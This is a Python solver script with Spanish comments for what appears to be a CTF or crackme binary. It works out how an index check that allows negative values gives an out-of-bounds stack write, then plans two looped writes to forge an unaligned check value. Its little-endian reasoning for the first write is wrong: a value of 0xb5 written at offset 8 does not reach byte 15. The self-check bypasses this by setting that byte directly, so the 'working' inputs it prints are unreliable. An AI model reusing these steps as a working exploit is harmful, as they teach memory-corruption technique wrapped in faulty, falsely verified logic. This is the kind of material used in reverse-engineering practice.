#!/usr/bin/env python3

# Análisis detallado del desensamblado:
# var_a0h está en [rbp - 0xa0]
# 
# 1. memset(var_a0h, 0, 0x98) → limpia 152 bytes
# 2. *(qword*)(var_a0h + 0xf) = 0xdeadbeef
# 3. Lee 3 números en: [var_a0h + 0x20], [var_a0h + 0x28], [var_a0h + 0x30]
# 4. Verifica num1 en rango [-7, 9]
# 5. Calcula y escribe: [rbp + (num1+6)*8 - 0x98] = num2 + num3
# 6. Lee resultado en: [rbp + (num1+6)*8 - 0x98]
# 7. Al salir del loop, verifica: *(qword*)(var_a0h + 0xf) == 0xb000000b5

print("=== Análisis del buffer ===\n")

# El buffer var_a0h tiene tamaño 0x98 = 152 bytes
# Está en [rbp - 0xa0]

# El canario está en offset 0xf = 15 desde var_a0h
# Posición absoluta: rbp - 0xa0 + 0xf = rbp - 0x91

print("Buffer var_a0h:")
print(f"  Posición: rbp - 0xa0")
print(f"  Tamaño: 0x98 = 152 bytes")
print()

print("Canario:")
print(f"  Offset desde var_a0h: 0xf = 15")
print(f"  Posición absoluta: rbp - 0x91")
print(f"  Valor inicial: 0xdeadbeef (extendido a qword: 0x00000000deadbeef)")
print(f"  Valor esperado: 0xb000000b5 (decimal: {0xb000000b5})")
print()

# Donde escribe el programa:
# [rbp + (num1+6)*8 - 0x98]

print("Escritura:")
print(f"  Fórmula: [rbp + (num1+6)*8 - 0x98]")
print(f"  0x98 = 152 en decimal")
print()

# Para que escriba en el canario:
# rbp + (num1+6)*8 - 0x98 = rbp - 0x91
# (num1+6)*8 = 0x98 - 0x91 = 0x7 = 7

print("Para sobrescribir el canario:")
print(f"  Necesitamos: (num1+6)*8 - 0x98 = -0x91")
print(f"  (num1+6)*8 = 0x98 - 0x91 = 0x7 = 7")
print(f"  num1 + 6 = 7/8 = 0.875 ← NO ES ENTERO!")
print()

print("¡Aquí está el MISALIGNMENT!")
print("  No podemos escribir exactamente en offset 15")
print("  Pero podemos escribir CERCA y causar overlap")
print()

# Veamos qué offsets podemos alcanzar
print("=== Offsets alcanzables ===\n")
print("num1  | (num1+6)*8 | Offset desde rbp | Bytes afectados")
print("------|------------|------------------|------------------")
for n in range(-7, 10):
    offset_rbp = (n + 6) * 8 - 0x98
    offset_var = offset_rbp + 0xa0  # offset desde var_a0h
    byte_start = offset_var
    byte_end = offset_var + 7
    marker = ""
    if 15 <= byte_start <= 22 or 15 <= byte_end <= 22 or (byte_start < 15 and byte_end > 22):
        marker = " ← SOBRESCRIBE CANARIO!"
    print(f"{n:5} | {(n+6)*8:10} | {offset_rbp:16} | {byte_start:3}-{byte_end:3}{marker}")

print()
print("El canario (qword en offset 15) ocupa bytes 15-22")
print()

# Conclusión:
# num1 = -5: offset 16-23 → sobrescribe bytes 16-22 del canario
# num1 = -6: offset 8-15 → sobrescribe byte 15 del canario (pero -6 fuera de rango!)

# Revisemos si -6 está en rango:
# El código verifica: 0xfffffffffffffff9 = -7 en complemento a 2
# Entonces rango es [-7, 9]

print("Rango válido de num1: [-7, 9]")
print()

# num1 = -6 ESTÁ en el rango!
# Pero escribiría en offset 8-15 desde var_a0h

# ¿Qué pasa si usamos num1 = -5?
# offset = 16-23, sobrescribe parcialmente el canario

# El canario se verifica como qword completo en offset 15-22
# Si escribimos qword en offset 16-23:
# - byte 15: no se toca (queda con valor original)
# - bytes 16-22: se sobrescriben
# - byte 23: se sobrescribe

# Valor original: 0x00000000deadbeef en offset 15
# Little endian: ef be ad de 00 00 00 00 en bytes 15-22

# Si escribimos 0xb000000b5 en offset 16:
# Little endian: b5 00 00 00 0b 00 00 00 en bytes 16-23

# El canario quedaría:
# byte 15: ef (original)
# bytes 16-22: b5 00 00 00 0b 00 00 (de nuestro write)
# byte 23: 00 (de nuestro write, pero fuera del canario)

# Canario = ef b5 00 00 00 0b 00 00 (little endian)
# En qword = 0x00000b000000b5ef

# NO coincide con 0xb000000b5

print("Estrategia con num1 = -5:")
print("  Write en offset 16-23")
print("  Canario en offset 15-22")
print("  Byte 15 no se modifica: 0xef")
print("  Bytes 16-22 se modifican con nuestro valor")
print()

# Otra opción: num1 = -6 (si está en rango)
# Escribe en offset 8-15, sobrescribe el INICIO del canario

print("Estrategia con num1 = -6:")
print("  Write en offset 8-15")
print("  Canario en offset 15-22")
print("  Solo byte 15 del canario se sobrescribe")
print("  Bytes 16-22 quedan con valor original (0x00000000 en little endian)")
print()

# Si escribimos en offset 8:
# bytes 8-15 se escriben
# byte 15 del canario se sobrescribe con el ÚLTIMO byte de nuestro write

# Target: 0xb000000b5 en little endian = b5 00 00 00 0b 00 00 00
# Último byte (byte 7 del qword) = 0x00

# Canario quedaría:
# byte 15: 0x00 (último byte de nuestro write)
# bytes 16-22: de ad de 00 00 00 00 (originales de 0xdeadbeef)

# Canario = 00 de ad de 00 00 00 00 en little endian
# En qword = 0x000000deadde00

# Tampoco coincide!

# Espera... probemos con offset 16:
target = 0xb000000b5
print(f"Target: 0x{target:016x} = {target}")
print(f"Target en bytes (little endian): {target.to_bytes(8, 'little').hex()}")
print()

# Necesitamos pensar diferente...
# El canario está en offset 15, pero un qword empieza en esa dirección
# Offset 15-22 (8 bytes)

# Si escribimos en offset 16 con valor V:
# Los bytes 16-23 se escriben con V
# El qword leído en offset 15 incluye:
#   - byte 15: original (0xef)
#   - bytes 16-22: nuestro V (7 bytes)
#   - (byte 23 también se escribe pero no se lee en el canario)

# Para que el qword en 15-22 sea 0xb000000b5:
# byte 15: 0xb5
# bytes 16-22: 0x00 0x00 0x00 0x0b 0x00 0x00 0x00
# Pero NO podemos controlar byte 15 con write en offset 16!

# Probemos write en offset 8 con num1 = -6:
# Escribe en bytes 8-15
# Para que byte 15 sea 0xb5, necesitamos que el byte 7 del qword sea 0xb5

value_for_offset_8 = 0xb5  # solo el último byte importa
print(f"num1 = -6, escribimos en offset 8-15")
print(f"  Para que byte 15 = 0xb5, escribimos qword terminado en 0xb5")
print(f"  Ejemplo: 0x00000000000000b5")
print(f"  Pero bytes 16-22 quedan como: de ad de 00 00 00 00 (de 0xdeadbeef)")
print(f"  Canario resultante: 0xb5deadde00000000 (little endian)")
print()

# Hmm, no funciona...

# Nueva idea: ¿Y si el canario NO está en offset 15 alineado?
# La instrucción dice: lea rax, [var_a0h]; add rax, 0xf; mov qword [rax], rsi
# Esto escribe un qword en dirección var_a0h + 0xf

# En memoria, si var_a0h es alineado a 8, entonces var_a0h + 0xf NO está alineado
# Esto es escritura DESALINEADA

# Pero el procesador maneja escrituras desalineadas correctamente
# El qword escrito en offset 15 ocupa bytes 15-22

# Recapitulemos con el código real:
# 0x00000a95  mov qword [rbp + rax*8 - 0x98], rdx
# donde rax = num1 + 6

# Esto escribe en: [rbp + (num1+6)*8 - 0x98]

# El canario está en: [rbp - 0xa0 + 0xf] = [rbp - 0x91]

# Para num1 = -6:
# [rbp + 0*8 - 0x98] = [rbp - 0x98]
# Offset desde rbp - 0xa0: -0x98 - (-0xa0) = 0x8

# Entonces escribimos en offset 0x8 del buffer, bytes 8-15

# Para num1 = -5:
# [rbp + 1*8 - 0x98] = [rbp - 0x90]
# Offset desde rbp - 0xa0: -0x90 - (-0xa0) = 0x10 = 16

# Entonces escribimos en offset 0x10 del buffer, bytes 16-23

print("=== Buscando la solución ===\n")

# El check es: qword [var_a0h + 0xf] == 0xb000000b5
# El qword en offset 0xf son los bytes 15-22

# Escritura desalineada en offset 15 directa no es posible
# Escritura en offset 8: afecta bytes 8-15 (solo byte 15 del canario)
# Escritura en offset 16: afecta bytes 16-23 (bytes 16-22 del canario)

# ¡Necesitamos DOS escrituras!
# 1. Escribir en offset 8 para controlar byte 15
# 2. Escribir en offset 16 para controlar bytes 16-22

# Pero el programa solo acepta UNA entrada... o entra en loop!

# WAIT! El programa tiene un LOOP! Podemos hacer múltiples escrituras!

print("¡El programa está en un loop! Podemos hacer múltiples writes!")
print()
print("Estrategia:")
print("  1. Primera iteración: num1=-6, escribir en offset 8 (bytes 8-15)")
print("  2. Segunda iteración: num1=-5, escribir en offset 16 (bytes 16-23)")
print("  3. Salir del loop (entrada inválida)")
print()

# Primera escritura (offset 8, bytes 8-15):
# Queremos byte 15 = 0xb5
# El byte 15 es el byte 7 del qword (indexando desde 0)
# Escribimos: 0xXXXXXXXXXXXXXXb5

write1_value = 0xb5  # Los otros bytes no importan para el canario
print(f"Write 1 (num1=-6): bytes 8-15")
print(f"  Necesitamos byte 15 = 0xb5")
print(f"  Escribimos qword con último byte 0xb5")
print(f"  Valor: cualquier qword terminado en 0xb5")
print(f"  Ejemplo: {write1_value} (= 0x{write1_value:016x})")
print()

# Segunda escritura (offset 16, bytes 16-23):
# Queremos bytes 16-22 = 0x00 0x00 0x00 0x0b 0x00 0x00 0x00
# Los bytes de un qword en little endian: b0 b1 b2 b3 b4 b5 b6 b7
# byte 16 = b0, byte 17 = b1, ..., byte 22 = b6

# Target bytes 16-22: 00 00 00 0b 00 00 00
# Qword que genera esto: 0x00000b00000000 (primeros 7 bytes)
# Pero escribimos 8 bytes, así que: 0xXX00000b000000

# El qword debe ser: 0b 00 00 00 00 00 00 XX
# En decimal: 0x0b (los primeros 7 bytes relevantes)

write2_value = 0x0b << (8 * 3)  # shift 3 bytes = 24 bits
print(f"Write 2 (num1=-5): bytes 16-23")
print(f"  Necesitamos bytes 16-22 = 00 00 00 0b 00 00 00")
print(f"  Qword en little endian con bytes 0-6: 00 00 00 0b 00 00 00")
print(f"  Valor: 0x{write2_value:016x} = {write2_value}")
print()

# Verifiquemos:
# Canario final:
# byte 15: 0xb5 (de write 1)
# bytes 16-22: primeros 7 bytes de write 2

canary_bytes = bytearray(8)
# Write 1 afecta byte 15 (índice 0 del canario en offset 15)
canary_bytes[0] = 0xb5

# Write 2 afecta bytes 16-22 (índices 1-7 del canario)
write2_bytes = write2_value.to_bytes(8, 'little')
for i in range(7):  # primeros 7 bytes
    canary_bytes[i+1] = write2_bytes[i]

canary_final = int.from_bytes(canary_bytes, 'little')
print(f"Canario final: 0x{canary_final:016x} = {canary_final}")
print(f"Target:        0x{0xb000000b5:016x} = {0xb000000b5}")
print(f"Match: {canary_final == 0xb000000b5}")
print()

if canary_final == 0xb000000b5:
    print("¡Perfecto! El exploit funciona:")
    print(f"  Iteración 1: -6 1 {write1_value - 1}")
    print(f"  Iteración 2: -5 1 {write2_value - 1}")
    print(f"  Iteración 3: 0 0 0 (sale del loop)")
else:
    # Recalculemos
    print("No coincide, recalculando...")
    target = 0xb000000b5
    target_bytes = target.to_bytes(8, 'little')
    print(f"Target bytes: {target_bytes.hex()}")
    print(f"  byte 0 (offset 15): 0x{target_bytes[0]:02x}")
    print(f"  bytes 1-7 (offset 16-22): {target_bytes[1:8].hex()}")
    
    write1 = target_bytes[0]  # byte 15
    write2 = int.from_bytes(target_bytes[1:8] + b'\x00', 'little')  # bytes 16-22
    
    print()
    print(f"Write 1: {write1}")
    print(f"Write 2: {write2}")
    print()
    print(f"  Iteración 1: -6 1 {write1 - 1}")
    print(f"  Iteración 2: -5 1 {write2 - 1}")